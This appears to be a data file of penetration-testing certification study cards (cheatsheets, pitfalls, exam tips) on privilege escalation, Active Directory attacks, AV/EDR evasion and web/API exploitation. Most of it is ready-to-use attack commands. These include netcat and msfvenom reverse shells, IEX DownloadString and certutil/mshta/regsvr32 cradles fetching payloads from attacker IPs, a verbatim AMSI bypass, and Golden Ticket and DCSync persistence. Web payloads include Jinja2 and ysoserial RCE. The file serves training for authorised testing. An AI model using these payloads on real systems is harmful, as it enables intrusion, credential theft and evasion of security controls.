summary: Techniques to escalate privileges on Linux systems.
cheatsheet_md:
## Linux Privilege Escalation Cheatsheet

### System Enumeration
*   `uname -a` - Kernel info.
*   `lsb_release -a` - OS release info.
*   `env` - Environment variables.

### User & Group Enumeration
*   `id` - Current user/groups.
*   `cat /etc/passwd` - List all users.
*   `sudo -l` - Check sudo permissions.

### Network & Processes
*   `netstat -ano` / `ss -tulpn` - Active network connections.
*   `ps aux` - List running processes.
*   `cat /etc/crontab` / `ls -la /etc/cron.*` - Scheduled tasks.

### Common Pathways
*   **SUID/SGID Executables**: `find / -perm -u=s -type f 2>/dev/null`
*   **Writable Files**: `find / -writable -type d 2>/dev/null`
*   **Capabilities**: `getcap -r / 2>/dev/null`
*   **Kernel Exploits**: Look for unpatched kernel versions using an exploit DB search.
*   **Path Abuse**: Checking if `.` or a writeable path is in `$PATH`.
pitfalls_md:
*   **Running blind exploits**: Firing off kernel exploits without confirming the exact kernel version can crash the system.
*   **Ignoring hidden files/files owned by a group you are in**: Often, backup files (.bak) or hidden config files contain credentials.
*   **Overlooking cron syntax**: A misconfigured cron job might be running as root but the script it calls might be writable by your user.
exam_tips_md:
*   Always start simple. Check `sudo -l` before trying a complex kernel exploit.
*   If you find an odd SUID binary, check GTFOBins (`https://gtfobins.github.io/`) immediately.
*   Enumerate automated scripts and processes, paying attention to what files they interact with.

title: Windows Privilege Escalation
summary: Techniques to escalate privileges on Windows systems.
cheatsheet_md:
## Windows Privilege Escalation Cheatsheet

### System Enumeration
*   `systeminfo` - OS details & hotfixes.
*   `whoami /all` - User name, SIDs, privileges.

### Privileges to Look For
*   `SeImpersonatePrivilege` / `SeAssignPrimaryTokenPrivilege`: Use tools like JuicyPotato, PrintSpoofer, or RoguePotato.
*   `SeBackupPrivilege`: Can copy SAM and SYSTEM hives to extract hashes.

### Service Enumeration
*   `sc qc [service_name]` - Query service configuration.
*   `Get-CimInstance Win32_Service` - PowerShell service enum.
*   **Unquoted Service Paths**: Look for paths without quotes containing spaces in `wmic service get name,displayname,pathname,startmode`.
*   **Weak Service Permissions**: `accesschk.exe /accepteula -uwcqv [user] [service]`.

### Scheduled Tasks
*   `schtasks /query /fo LIST /v` - View full task details.
*   Check for jobs where the executable is writable by the current user.

### Registry & AutoRuns
*   `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run` - Startup programs.
*   Check AlwaysInstallElevated registry keys.
pitfalls_md:
*   **Crashing services**: Modifying services without knowing dependencies can freeze the machine.
*   **Overlooking `whoami /priv`**: Many students jump to script-running without realizing they have a direct path via privileges.
*   **Missed AppLocker rules**: Trying to run standard executables in restricted directories.
exam_tips_md:
*   Run PowerUp or winPEAS early, but read the output carefully rather than blindly following its 'red' text.
*   If you find `SeImpersonatePrivilege`, PrintSpoofer or GodPotato are your best friends.
*   Always check `C:\Users\[User]\AppData` for leftover configurations containing credentials.

title: Getting Started
summary: Set up your penetration testing environment, understand basic terminology, and learn fundamental concepts.
cheatsheet_md:
## Getting Started Cheatsheet

### Essential Tools
*   **Netcat**: `nc -lvnp 4444` (listener), `nc [IP] 4444 -e /bin/bash` (bind or reverse).
*   **Curl**: `curl -v http://target` (HTTP interaction/downloading).
*   **Tmux**: `tmux new -s session_name`, `Ctrl+b d` to detach, `tmux attach -t session_name`.

### Basic Linux Commands
*   `chmod +x script.sh` - Make executable.
*   `grep -ri "password" /var/www/html` - Search recursively.
*   `find / -name "flag.txt"` - Locate files by name.

### Basic Windows Commands
*   `ipconfig /all` - Network config.
*   `net user` - List local users.
*   `type file.txt` - Read file contents.
pitfalls_md:
*   **Losing shells**: Forgetting to stabilize a reverse shell (using `python3 -c 'import pty;pty.spawn("/bin/bash")'`) can lead to accidental shell closure.
*   **Tool reliance**: Running a tool without understanding its syntax and expecting magic to happen.
*   **Not checking connectivity**: Troubleshooting an exploit when there's a firewall blocking your ping or reverse shell.
exam_tips_md:
*   Take time to configure your environment (Tmux/Terminator) before starting the exam.
*   Familiarize yourself with stabilizing a shell within seconds of catching it.
*   Double-check your IP addresses: OpenVPN IP vs local interface IP.

title: Vulnerability Scanning with Nessus
summary: Using Nessus Professional for comprehensive vulnerability scanning and assessment.
cheatsheet_md:
## Vulnerability Scanning with Nessus

### Configuration & Setup
*   **Installation**: Typically runs on port `8834` (https://localhost:8834).
*   **Policies**: Create customized scan templates (e.g., specific port ranges, specific auth methods) instead of always running Basic Network Scan.

### Scan Types
*   **Host Discovery**: Ping sweeps to map the network.
*   **Basic Network Scan**: Standard overarching vulnerability scan.
*   **Credentialed Scan**: Provides deeper insights (e.g., missing patches, local misconfigs) by logging via SSH/WMI.
*   **Compliance Scan**: Checks against CIS benchmarks or similar frameworks.

### Reviewing Results
*   Group by vulnerability to see how widespread an issue is.
*   Check the "Plugin Output" for proof of execution or specifics on why Nessus flagged it.
pitfalls_md:
*   **Scanning without credentials**: You'll miss 80% of local vulnerabilities and missing patches.
*   **Reckless scanning**: Using overly aggressive scan settings (like unsafe checks) can drop a delicate production service.
*   **Blindly trusting severity ratings**: Nessus might mark a potential web shell as 'Medium', but in a pentest, it's a critical entry point.
exam_tips_md:
*   In practical situations, export Nessus results (HTML/CSV) to easily parse or include in reporting structures.
*   If a host seems empty, verify your scan isn't being dropped by a local host firewall or incorrect routing.

title: Vulnerability Scanning with OpenVAS
summary: Open-source vulnerability scanning with Greenbone/OpenVAS.
cheatsheet_md:
## Vulnerability Scanning with OpenVAS

### Setup & Operations
*   Started via Greenbone Security Assistant (GSA) web UI.
*   Architecture involves `gvmd` (manager), `openvas-scanner`, and `gsad` (web UI).
*   **Feed Updates**: `greenbone-feed-sync` (must be updated regularly for the latest NVT definitions).

### Core Concepts
*   **Targets**: IP addresses, CIDR blocks.
*   **Tasks**: A combination of a target and a scan config (e.g., Full and Fast).
*   **Reports**: Output generated after a task completes. Can be exported to PDF XML.

### Usage Details
*   Ensure the feed state is 'Current' before scanning.
*   For authenticated scans, set up Credentials in GSA and attach them to the Target.
pitfalls_md:
*   **Stale feeds**: Scanning with old Network Vulnerability Tests (NVTs) means missing critical modern vulnerabilities.
*   **Resource starvation**: OpenVAS is resource-intensive. Running highly concurrent scans can crash the scanner VM.
*   **Overlooking overrides**: Forgetting to configure 'Overrides' for false positives can skew final reports.
exam_tips_md:
*   While CPTS heavily focuses on manual exploitation, understanding the output of an OpenVAS XML is crucial for automation components.
*   If GSA is unresponsive, check the disk space; OpenVAS logs and databases grow massively.

title: Documentation & Reporting
summary: Professional penetration test documentation, note-taking, and report writing.
cheatsheet_md:
## Documentation & Reporting Cheatsheet

### Key Components of a Report
1.  **Executive Summary**: High-level overview, business risk, and strategic recommendations (written for C-level).
2.  **Scope & Methodology**: What was tested, how, and limitations.
3.  **Narrative / Attack Chain**: How the complete compromise occurred, chaining vulnerabilities.
4.  **Technical Findings**: Detailed write-ups for each vulnerability.
    *   Title, Severity, CVSS score.
    *   Description of the flaw.
    *   Impact.
    *   Proof of Concept (PoC) / Steps to Reproduce.
    *   Remediation.

### Tools & Best Practices
*   **Note-taking**: Obsidian, Notion, or CherryTree.
*   **Screenshots**: Flameshot or Greenshot.
*   *Rule of Thumb*: Include enough detail in the PoC that a non-security IT admin could replicate the attack.
pitfalls_md:
*   **Poor PoC steps**: Stating "Exploited MS17-010 to get shell" without showing the command run or the output received.
*   **Jargon in Executive Summary**: Confusing stakeholders with overly technical explanations.
*   **Missing remediation**: Pointing out a flaw but providing zero actionable advice to fix it.
exam_tips_md:
*   The CPTS exam requires a thorough, professional report. It is as important as the hack itself.
*   Document as you go. Do not wait until day 7 to start writing your notes.
*   Always format code blocks and command outputs cleanly.

title: Attacking Enterprise Networks
summary: Simulated real-world penetration test combining all skills - External to Internal to Domain Admin.
cheatsheet_md:
## Attacking Enterprise Networks

### Enterprise Methodology
1.  **External Recon**: OSINT, certificate parsing, ASN enum.
2.  **Perimeter Breach**: Phishing, VPN bruteforce, attacking external web apps (e.g., OWA, Citrix).
3.  **Internal Footprinting**: Active Directory enumeration via BloodHound, PowerView.
4.  **Local Privilege Escalation**: Escalate from a standard user to local SYSTEM on a single endpoint.
5.  **Lateral Movement**: Moving from desktop to desktop or desktop to server (Pass the Hash, WMI, WinRM).
6.  **Domain Escalation**: Path to Domain Admin (Kerberoasting, AS-REP roasting, BloodHound paths).

### Tool Chains
*   `Responder` for catching hashes on local segments.
*   `BloodHound` / `SharpHound` for mapping AD relationships.
*   `CrackMapExec` / `NetExec` for credential spraying and execution.
pitfalls_md:
*   **Tunnel vision**: Getting stuck on one unexploitable machine for days while ignoring 50 other machines on the subnet.
*   **Noisy actions**: Running aggressive tools (like mass nmap scans or spray commands) without thinking about account lockouts and IDS alerts.
*   **Losing C2 access**: Relying on a single unstable reverse shell instead of dropping persistence or alternative beacons.
exam_tips_md:
*   Always keep your notes organized by host and network segment.
*   Map out routing early. If you pivot, ensure your proxychains are set up correctly.
*   Use `NetExec` (formerly CrackMapExec) heavily for situational awareness.

title: LLMNR/NBT-NS Poisoning
summary: Capture hashes via Link-Local Multicast Name Resolution and NetBIOS Name Service poisoning.
cheatsheet_md:
## LLMNR/NBT-NS Poisoning Cheatsheet

### Concepts
*   **LLMNR** (Link-Local Multicast Name Resolution) and **NBT-NS** (NetBIOS Name Service) are fallback mechanisms when DNS resolution fails in Windows networks.
*   An attacker can listen for these broadcasts and spoof the response, requesting authentication from the victim.

### Responder Usage
*   **Start Responder**: `sudo responder -I <interface> -dw`
*   *Flags*: `-I` (Interface), `-d` (Enable DHCP responses), `-w` (Enable WPAD rogue proxy).
*   **Captured Hashes**: Stored in `/usr/share/responder/logs/` or `Responder/logs/`.

### Cracking NTLMv2
*   Hashes intercepted are NetNTLMv1 or NetNTLMv2.
*   `hashcat -m 5600 hashes.txt wordlist.txt` (NetNTLMv2).

### Mitigation
*   Disable LLMNR via Group Policy (Computer Configuration -> Administrative Templates -> Network -> DNS Client).
*   Disable NBT-NS on network adapter settings.
pitfalls_md:
*   **Using Responder continuously on production**: Responder can break network connectivity/DNS if it aggressively poisons legitimate requests.
*   **Trying to Pass-the-Hash with NetNTLMv2**: You CANNOT Pass-the-Hash with a NetNTLM challenge/response hash; it must be cracked or relayed.
*   **Poisoning self**: Sometimes you poison your own VMs or team infra on a shared network layer.
exam_tips_md:
*   Fire up Responder early when you land on an internal network segment, it's low hanging fruit.
*   If cracking fails, immediately transition to NTLM Relaying (ntlmrelayx) against machines with SMB signing disabled.

title: Pass the Ticket & Pass the Certificate
summary: Lateral movement using Kerberos tickets and certificates.
cheatsheet_md:
## Pass the Ticket & Pass the Certificate

### Pass the Ticket (PtT)
*   Use compromised Kerberos tickets (TGT or TGS) to authenticate as a user without their password or hash.
*   **Linux (Impacket)**:
    *   Set `export KRB5CCNAME=/path/to/ticket.ccache`.
    *   Use tools: `psexec.py -k -no-pass host.domain.local`.
*   **Windows (Rubeus/Mimikatz)**:
    *   `Rubeus.exe ptt /ticket:base64_or_file.kirbi`
    *   `mimikatz # kerberos::ptt ticket.kirbi`

### Pass the Certificate
*   Extracting a machine or user certificate containing a private key (.pfx) to authenticate as them to ADCS/LDAP.
*   **Certipy (Linux)**: `certipy auth -pfx user.pfx -dc-ip <IP>` -> Retrieve NT hash or TGT.
*   **Rubeus (Windows)**: `Rubeus.exe asktgt /user:User /certificate:cert_blob /password:cert_pass /ptt`
pitfalls_md:
*   **Timestamp desynchronization**: Kerberos explicitly requires clock synchronization (< 5 mins). If your attacker box clock is off, PtT will fail!
*   **Using IP instead of FQDN**: Kerberos tickets require the hostname/SPN. Doing `psexec.py -k 10.10.10.10` fails. Use FQDN (e.g., `dc01.corp.local`).
*   **Linux ccache vs Windows kirbi**: Make sure to convert formats if copying a ticket from Windows to attack box (using ticket_converter.py).
exam_tips_md:
*   Adding the target to `/etc/hosts` to match the exact Active Directory FQDN is absolutely critical for Kerberos attacks.
*   If you find `.pfx` or `.pem` with a private key, try authenticating to LDAPS.

title: ACL Abuse
summary: Exploiting misconfigured Active Directory Access Control Lists.
cheatsheet_md:
## ACL Abuse Cheatsheet

### Key Concepts
*   Access Control Lists (ACLs) define who can do what to AD objects.
*   **ACEs** (Access Control Entries) grant specific rights like `GenericAll`, `WriteDacl`, `ForceChangePassword`, etc.

### Enumeration
*   **BloodHound**: Best way to visualize ACL attack paths (e.g., User A has ForceChangePassword over User B).
*   **PowerView**: `Get-ObjectAcl -SamAccountName "TargetUser" -ResolveGUIDs`.

### Common Exploits
*   **ForceChangePassword**: Changes a user's password without knowing old one. `Set-DomainUserPassword -Identity TargetUser -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force)`
*   **GenericAll / GenericWrite**: Add yourself to a group, or change properties. `Add-DomainGroupMember -Identity TargetGroup -Members AttackerUser`.
*   **WriteDacl**: Add an ACE granting yourself GenericAll. `Add-DomainObjectAcl -TargetIdentity Target -PrincipalIdentity Attacker -Rights All`.
*   **DCSync (GetChangesAll)**: Replicate directory changes. Extracts hashes using `secretsdump.py`.
pitfalls_md:
*   **Changing passwords blindly**: Doing `ForceChangePassword` on an active admin might cause lockouts and gets noticed quickly. Ensure it's absolutely necessary or a service account you can revert.
*   **Misreading BloodHound**: Ensure that the arrow direction means 'YOU have rights OVER Target', not the reverse.
*   **Replication delays**: Changing an ACL on one Domain Controller might take minutes to replicate to the DC you use for authentication.
exam_tips_md:
*   Use `bloodyAD` or `PowerView` mapped to BloodHound to execute your ACL abuse.
*   When dumping hashes via DCSync, only dump specific target users if possible to save time and reduce network noise.

title: Domain Trust Attacks
summary: Exploiting trust relationships between domains and forests.
cheatsheet_md:
## Domain Trust Attacks Cheatsheet

### Key Concepts
*   **Trusts** link domains or forests, allowing users in Domain A to access resources in Domain B.
*   **Transitive vs Nontransitive**: If A trusts B, and B trusts C, A trusts C (Transitive).
*   **Intra-forest vs Inter-forest**: Trusts within the same AD forest vs trusts to entirely different external forests.

### Enumeration
*   **PowerView**: `Get-DomainTrust` or `Get-ForestTrust`.
*   **NetExec**: `nxc smb <DC-IP> -u user -p pass --trusts`.

### Escalation & Exploitation
*   **Child to Parent (Intra-forest)**: Compromise child domain -> dump KRBTGT -> Forge an Golden Ticket with `SID History` containing the Enterprise Admins SID. 
    *   `mimikatz # kerberos::golden /user:Administrator /domain:child.local /sid:<child_sid> /sids:<parent_sid>-519 /krbtgt:<krbtgt_hash> /ptt`
*   **Across Forests**: Usually relies on hunting mapped users/groups or exploiting misconfigured Foreign Security Principals.
pitfalls_md:
*   **Using the wrong SID**: SID history attacks fail if you append the wrong 519/512 relative identifier or supply the incorrect krbtgt.
*   **Assuming trust = admin**: An Inter-forest trust does NOT mean Enterprise Admin. It just means you can authenticate. You still need an authorization path.
*   **Name resolution issues**: Querying foreign domains requires DNS routing. Make sure your DNS server is pointing to the DC handling the trust.
exam_tips_md:
*   In exam scenarios with multiple domains, immediately map trusts and check for `Enterprise Admins` groups.
*   `SID History` Golden Tickets are your reliable key from Child to Forest Root.

title: Constrained & Unconstrained Delegation
summary: Abusing Kerberos delegation for privilege escalation and lateral movement.
cheatsheet_md:
## Delegation Attacks Cheatsheet

### Types of Delegation
1.  **Unconstrained Delegation (UD)**: Server caches TGTs of users who connect to it. If you compromise the server, you steal TGTs (e.g., Domain Admin connects, you dump TGT).
2.  **Constrained Delegation (CD)**: Server is allowed to impersonate users, but ONLY to specific other services.
3.  **Resource-Based Constrained Delegation (RBCD)**: The target service controls who can impersonate it, configured via the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.

### Exploitation Tools
*   **Rubeus**: Used heavily for `s4u` attacks (S4U2Self / S4U2Proxy) which simulate the delegation process.
*   *Rubeus S4U Syntax*: `Rubeus.exe s4u /user:ServiceAcc /rc4:Hash /impersonateuser:Administrator /msdsspn:cifs/target.local /ptt`
*   **Impacket**: `getST.py` mimics Rubeus for Linux-based s4u attacks.

### Checking Delegation
*   `Get-DomainUser -TrustedToAuth` (Constrained)
*   `Get-DomainComputer -Unconstrained` (Unconstrained)
pitfalls_md:
*   **Service account vs Computer account**: Make sure you use the correct RC4/AES hash. If a user runs the service, use the user's hash; if NETWORK SERVICE, use the machine account hash ending in `$`.
*   **Failing to fetch TGS**: S4U attacks are complex. Provide the correct domain formatting, RC4 hash, and `msdsspn` string exactly as listed in AD.
*   **Protocol Transition**: Some constrained delegations require `TrustedToAuthForDelegation` to be true.
exam_tips_md:
*   Delegation is highly likely to feature in advanced labs. Master `getST.py` and `Rubeus.exe s4u`.
*   Look out for generic write permissions on computer objects; it's a direct path to RBCD.

title: AD CS Attacks
summary: Exploiting Active Directory Certificate Services misconfigurations.
cheatsheet_md:
## AD CS Attacks Cheatsheet

### Active Directory Certificate Services (AD CS)
*   AD CS acts as a Public Key Infrastructure (PKI). Misconfigurations can lead to Domain escalation.

### Enumeration (Certipy / Certify)
*   **Certipy**: `certipy find -u user -p pass -dc-ip <dc-ip> -vulnerable -stdout`
*   Look for Vulnerable Templates (ESC1, ESC2, ESC3, ESC4, ESC8).

### Common Vulnerabilities
*   **ESC1**: Template allows ENROLLEE SUPPLIES SUBJECT -> You specify the SAN (Subject Alternative Name) as a Domain Admin.
    *   `certipy req -u user -p pass -ca CA-NAME -template VulnerableTemp -upn administrator@domain.local`
*   **ESC4**: Template ACL gives you write permissions to the template -> Modify it to become ESC1.
*   **ESC8**: NTLM Relay to AD CS HTTP Web Enrollment.
    *   Trigger authentication (e.g., PetitPotam) -> `ntlmrelayx.py -t http://ca.domain/certsrv/certfnsh.asp -smb2support --adcs`.

### Artifact Usage
*   Convert `.pfx` or use certipy to obtain TGT/NTLM hash of the target.
pitfalls_md:
*   **Wrong CA string**: When requesting a cert, the `-ca` string must perfectly match the CA name (not the hostname), enumerated via `certipy find`.
*   **Certificate Expiration/Revocation**: Ensure the CA is actually issuing certificates and you aren't fighting AD policies.
*   **Relaying to HTTPS**: ESC8 ntlm relay generally fails if the Web Enrollment has HTTPS/EPA (Extended Protection for Auth) strictly enforced.
exam_tips_md:
*   `Certipy` is your primary weapon. Master `find`, `req`, and `auth` commands.
*   Always check if a template requires manager approval. If it does, ENROLLEE SUPPLIES SUBJECT won't yield an immediate cert.

title: Advanced Windows Privilege Escalation
summary: Windows privilege escalation elevates from a low-privilege user or service account to SYSTEM or local Administrator. Methodology: enumerate first with winPEAS or manual checks, then exploit. Key vectors: misconfigured service binaries (unquoted service paths, weak service binary permissions), AlwaysInstallElevated (installs MSI as SYSTEM), SeImpersonatePrivilege (Potato attacks), scheduled tasks with writable scripts, DLL hijacking, unpatched kernel exploits, and credentials in registry/files. Token impersonation is the fastest path when running as a service account.
cheatsheet_md:
Automated Enumeration

# winPEAS:
.\winPEAS.exe > winpeas_output.txt
# PowerUp:
Import-Module .\PowerUp.ps1
Invoke-AllChecks
# Seatbelt:
.\Seatbelt.exe -group=all

Unquoted Service Path

wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows"

SeImpersonatePrivilege — Potato Attacks

# Check privileges:
whoami /priv
# GodPotato (Windows 10/11/2022):
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
# PrintSpoofer (Server 2016/2019):
.\PrintSpoofer64.exe -i -c cmd

AlwaysInstallElevated

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Exploit:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi

Credential Hunting

reg query HKLM /f password /t REG_SZ /s
cmdkey /list
type C:\Windows\Panther\Unattend.xml
pitfalls_md:
• Not checking token privileges first — whoami /priv reveals SeImpersonatePrivilege. If present, Potato attacks give instant SYSTEM. Most common easy path on Windows targets.
  • Running winPEAS in a visible window — redirect to file. May be flagged by AV — use in-memory execution.
  • Not verifying unquoted service path is exploitable — confirm write permission with icacls on the parent directory before exploiting.
  • Forgetting AlwaysInstallElevated requires both keys — both HKCU AND HKLM must be set to 1. Either alone is not exploitable.
  • Stopping at local admin without full SYSTEM — confirm whoami after escalation. Some exploits give local admin, not SYSTEM.
exam_tips_md:
• whoami /priv is the first command on any Windows target. SeImpersonatePrivilege = GodPotato. SeBackupPrivilege = read any file. SeDebugPrivilege = inject into privileged processes.
  • PowerUp Invoke-AllChecks in memory: IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/PowerUp.ps1'); Invoke-AllChecks
  • After SYSTEM: dump hashes with Mimikatz (lsadump::sam, sekurlsa::logonpasswords) then spread with nxc.
  • Credential hunting: always check registry, cmdkey /list, and Unattend.xml first — stored credentials yield instant escalation more often than complex exploits.
  • Transfer tools in-memory: IEX DownloadString avoids disk writes and bypasses most AV.

title: Active Directory Persistence
summary: After gaining Domain Admin access, establishing persistence prevents losing access when credentials rotate. Key mechanisms: Golden Ticket (forged TGT using krbtgt hash — valid 10 years), Silver Ticket (forged TGS for specific service — no DC contact), DCSync persistence (granting replication rights to controlled account), AdminSDHolder abuse, skeleton key, and DSRM password abuse. Advanced techniques: ACL-based attacks (WriteDACL, GenericWrite), ADCS abuse including ESC1-ESC8, and shadow credentials.
cheatsheet_md:
Golden Ticket

# Get domain SID:
Get-ADDomain | select DomainSID
# Mimikatz:
kerberos::purge
kerberos::golden /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-XXX /krbtgt:NTLM_HASH /ptt
# Impacket:
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXX -domain corp.local FakeAdmin

ADCS — ESC1

# Find vulnerable templates:
Certify.exe find /vulnerable
certipy find -u user@corp.local -p pass -dc-ip 10.10.10.5 -vulnerable
# Exploit ESC1:
certipy req -u user@corp.local -p pass -dc-ip 10.10.10.5 -target ca.corp.local -template VulnTemplate -upn administrator@corp.local -ca corp-CA
# Auth with cert:
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.5

Shadow Credentials

# Requires GenericWrite on target:
Whisker.exe add /target:administrator
# Use certificate:
Rubeus.exe asktgt /user:administrator /certificate:BASE64 /password:pass /ptt

DCSync Persistence

Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity lowprivuser -Rights DCSync
impacket-secretsdump corp.local/lowprivuser:pass@10.10.10.5 -just-dc-ntlm
pitfalls_md:
• Not re-forging Golden Ticket after krbtgt double-reset — defenders must reset krbtgt twice to invalidate all Golden Tickets. Re-obtain the hash before losing DA access.
  • Wrong domain SID in Golden Ticket — The domain SID must be exact. Verify with Get-ADDomain | select DomainSID or lookupsid.
  • Overlooking ADCS — Always run Certify.exe find /vulnerable after obtaining domain credentials. ESC1 gives direct DA certificate.
  • Not cleaning up persistence artifacts — Document and remove all persistence mechanisms at end of engagement.
  • Confusion between Silver/Golden Ticket logging — Golden Tickets generate Event 4768 on DC. Silver Tickets bypass DC entirely — no KDC log.
exam_tips_md:
• DCSync krbtgt immediately after gaining DA — store the hash off-target. A Golden Ticket gets you back if you lose access.
  • Run certipy find -vulnerable as first step with domain credentials — ADCS ESC1 is the fastest DA escalation path when templates are misconfigured.
  • Shadow Credentials requires GenericWrite — BloodHound shows this. Check if any owned account has GenericWrite on a privileged user or computer.
  • AdminSDHolder abuse provides durable ACL persistence — modifications propagate to protected groups every 60 minutes automatically.
  • Document forging parameters for Golden/Silver Tickets in notes for the exam report.

title: Bypassing AV and EDR
summary: Bypassing security controls is essential in modern engagements. Evasion operates at multiple layers: static detection (signature-based — bypass by encoding, obfuscation, custom compilation), dynamic/behavioural detection, and memory-based detection (AMSI — bypass by patching in-memory; ETW — patch Event Tracing). Key techniques: PowerShell AMSI bypass, binary obfuscation, living-off-the-land binaries (LOLBins — mshta, regsvr32, certutil, msiexec), process injection, and reflective DLL loading.
cheatsheet_md:
AMSI Bypass

[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

In-Memory Execution

IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/PowerView.ps1')
IEX (iwr 'http://10.10.14.5/tool.ps1' -UseBasicParsing)

LOLBins

# Download:
certutil.exe -urlcache -split -f http://10.10.14.5/file.exe file.exe
# Execute HTA:
mshta http://10.10.14.5/payload.hta
# Scriptlet:
regsvr32 /s /n /u /i:http://10.10.14.5/payload.sct scrobj.dll
# MSI:
msiexec /q /i http://10.10.14.5/payload.msi

Obfuscation

$c = 'I' + 'EX'
& ([scriptblock]::Create((New-Object Net.WebClient).DownloadString('http://10.10.14.5/ps.ps1')))
pitfalls_md:
• Using well-known AMSI bypass strings verbatim — Classic strings are themselves signatures. Use string splitting, char arrays, or reflection-based patches with obfuscated names.
  • Relying on Shikata Ga Nai — SGN is fully detected. Use custom C# shellcode droppers, process injection, or DONUT.
  • Not testing evasion in an isolated VM first — Always test against the specific AV product version offline.
  • Forgetting EDR monitors behaviour not just signatures — Process injection, abnormal LSASS access, PowerShell downloading executables are all EDR behavioural triggers.
  • Using certutil on monitored networks — certutil downloads are logged in event logs. Use alternatives (Start-BitsTransfer) when OPSEC matters.
exam_tips_md:
• Apply AMSI patch as the first step before any tool execution in a PowerShell session.
  • In-memory execution (IEX DownloadString) is your default for PowerShell tools — never write to disk if avoidable.
  • LOLBins (mshta, regsvr32, certutil, msiexec) are invaluable when PowerShell is blocked.
  • Check LanguageMode: $ExecutionContext.SessionState.LanguageMode. If ConstrainedLanguage, use C# or cmd.exe alternatives.
  • Document AV/EDR bypass with exact commands, bypass methodology, and evidence of evasion in the report.

title: Advanced Web Attacks
summary: Advanced web attacks go beyond OWASP Top 10 basics. SSRF makes the web server perform requests to internal/cloud resources — reaching AWS metadata (169.254.169.254). SSTI injects template syntax into server-side rendering engines (Jinja2, Twig, Freemarker) achieving RCE. Insecure Deserialization: untrusted serialised objects processed without validation exploitable with ysoserial (Java), pickle (Python). JWT attacks: alg confusion RS256 to HS256. OAuth: redirect_uri manipulation.
cheatsheet_md:
SSRF

# Detection:
url=http://10.10.14.5/ssrf-test
# AWS metadata:
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Bypass filters:
# Decimal: http://2130706433/ = 127.0.0.1
# IPv6: http://[::1]/

SSTI Detection

{{7*7}}   # Jinja2/Twig -> 49
${7*7}    # Freemarker/Velocity -> 49
<%= 7*7 %>  # ERB -> 49

Jinja2 RCE

{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

Java Deserialization

# Detection only (no dependencies):
java -jar ysoserial.jar URLDNS 'http://10.10.14.5/test' | base64 -w0
# RCE:
java -jar ysoserial.jar CommonsCollections6 'curl http://10.10.14.5/ -o /tmp/s.sh' | base64 -w0

Python Pickle RCE

import pickle, os, base64
class E(object):
    def __reduce__(self):
        return (os.system, ('id',))
print(base64.b64encode(pickle.dumps(E())))

JWT RS256 to HS256

python3 jwt_tool.py TOKEN -X k -pk server_public.pem
pitfalls_md:
• Stopping SSRF at localhost — Always target 169.254.169.254 on cloud targets. IAM credentials from AWS metadata = full cloud access.
  • Wrong SSTI payload for the engine — Identify the engine first. {{7*7}} for Jinja2, ${7*7} for Freemarker, <%= 7*7 %> for ERB.
  • Using wrong ysoserial gadget chain — Use URLDNS (no dependencies) first to confirm deserialization, then enumerate classpath for correct chain.
  • Not testing SSRF protocol handlers — Beyond HTTP: file://, gopher://, dict://, ftp://. Protocol support varies by library.
  • Missing blind SSRF — Set up Burp Collaborator or interactsh for OOB detection. No response does not mean no SSRF.
exam_tips_md:
• For SSRF: always test AWS/GCP/Azure metadata endpoint. IAM credentials from metadata = full cloud account access.
  • SSTI: inject {{7*7}}, ${7*7}, <%= 7*7 %> in every user-facing input. If any returns 49, confirmed — move to RCE payload.
  • ysoserial URLDNS for blind deserialization confirmation — no side effects, just a DNS callback. Then try RCE chains.
  • JWT attacks: always decode first (Burp JWT Editor or jwt.io). Test alg=none, HS256 with public key, and claim manipulation.
  • OAuth: test strict redirect_uri validation — extra path, subdomain, and wildcard bypasses are common misconfigurations.

title: API Penetration Testing
summary: Modern applications expose REST, GraphQL, and SOAP APIs requiring dedicated testing. API recon: find docs (/swagger, /openapi.json, /graphql), enumerate endpoints from JavaScript. REST attacks: IDOR, broken function-level auth, mass assignment (extra fields processed), rate limiting bypass, JWT attacks. GraphQL: introspection for full schema, recursive query DoS, batching attacks. SOAP: XXE injection, SQL injection in parameters.
cheatsheet_md:
API Recon

/api/ /api/v1/ /swagger /swagger.json /swagger-ui.html
/openapi.json /api-docs /graphql /graphiql
# ffuf:
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -u http://target.com/api/v1/FUZZ -mc 200,201,401,403

GraphQL Introspection

curl -X POST http://target.com/graphql -H 'Content-Type: application/json' -d '{"query":"{ __schema { types { name fields { name } } } }"}'

BOLA/IDOR Test

# As user A, access user B's resource:
GET /api/v1/users/43  # (your ID is 44)
# If it returns user 43's data = BOLA

Mass Assignment

# GET /api/v1/user/me returns: {"id":42,"role":"user","credit":100}
# PUT /api/v1/user/42 with: {"id":42,"role":"admin","credit":99999,"isAdmin":true}

Rate Limit Bypass

X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
pitfalls_md:
• Skipping GraphQL introspection — If enabled, it reveals the entire API schema including undocumented endpoints and sensitive field names.
  • Not testing all HTTP methods — GET restricted but DELETE unprotected. Always run OPTIONS and test each allowed method.
  • Missing mass assignment on update endpoints — PATCH/PUT are more commonly vulnerable than POST registration endpoints.
  • Not checking API versioning — /api/v1/ may be secured while /api/v2/ has new vulnerabilities, or vice versa. Test all detected versions.
  • Ignoring response headers — X-Powered-By, Server, X-API-Version reveal framework and version. Error messages expose internal paths and queries.
exam_tips_md:
